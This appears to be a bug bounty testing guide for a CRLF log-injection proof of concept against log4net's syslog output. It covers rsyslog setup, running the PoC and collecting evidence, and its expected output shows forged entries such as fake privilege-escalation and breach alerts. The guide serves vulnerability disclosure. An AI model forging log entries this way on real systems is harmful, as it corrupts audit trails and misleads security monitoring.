# Testing Guide: CRLF Injection PoC

## Setup Syslog Server

### 1. Install rsyslog
```bash
sudo apt install rsyslog
```

### 2. Enable UDP Port 514
Edit `/etc/rsyslog.conf`:
```bash
sudo nano /etc/rsyslog.conf
```

Uncomment or add:
```
module(load="imudp")
input(type="imudp" port="514")
```

### 3. Restart rsyslog
```bash
sudo systemctl restart rsyslog
sudo netstat -uln | grep 514  # check UDP listening
```

## Run PoC

### Terminal 1: Monitor Syslog
```bash
sudo tail -f /var/log/syslog | grep log4net-poc
```

### Terminal 2: Execute PoC
```bash
cd Log4netCRLFPoC
dotnet run
```

## Expected Results

### Test 1: Normal (Baseline)
```
<timestamp> localhost log4net-poc: Normal user login: alice
```
✅ **1 entry** - normal behavior

### Test 2: CRLF Injection (CRITICAL)
```
<timestamp> localhost log4net-poc: User login: alice
<timestamp> localhost log4net-poc: <134>1 2024-01-15T10:30:00Z fakehost myapp - - - FORGED: Admin privilege escalation
```
🔴 **2 entries from 1 log call** - VULNERABLE!

### Test 3: Multiple CRLF
```
<timestamp> localhost log4net-poc: Failed login attempt: normal_user
<timestamp> localhost log4net-poc: <134>FAKE ALERT: Security breach detected
<timestamp> localhost log4net-poc: <134>FAKE INFO: Unauthorized access successful
```
🔴 **3 entries from 1 log call** - VULNERABLE!

## Verification

### Count Total Entries
```bash
sudo grep "log4net-poc" /var/log/syslog | wc -l
```
**Expected:** 15-16 entries (from only 6 log calls)

### Find Forged Entries
```bash
sudo grep "log4net-poc.*<134>" /var/log/syslog
```
If entries with `<134>` in message body appear = **CONFIRMED VULNERABLE** ✅

## Troubleshooting

### No logs appearing?
```bash
# Check rsyslog running
sudo systemctl status rsyslog

# Check config syntax
sudo rsyslogd -N1

# Alternative: journalctl
sudo journalctl -f | grep log4net
```

### Permission denied port 514?
Ports <1024 require sudo. Or change to port >1024:
- Edit `App.config`: `<remotePort value="5514" />`
- Edit `/etc/rsyslog.conf`: `input(type="imudp" port="5514")`

## Evidence Collection

Take screenshots:
1. Terminal PoC execution
2. Terminal syslog output showing **multiple entries from single log call**

Save output:
```bash
sudo grep "log4net-poc" /var/log/syslog > evidence.txt
```

Upload to bug bounty report:
- `evidence.txt`
- Terminal screenshot
- PoC code (`Program.cs`)
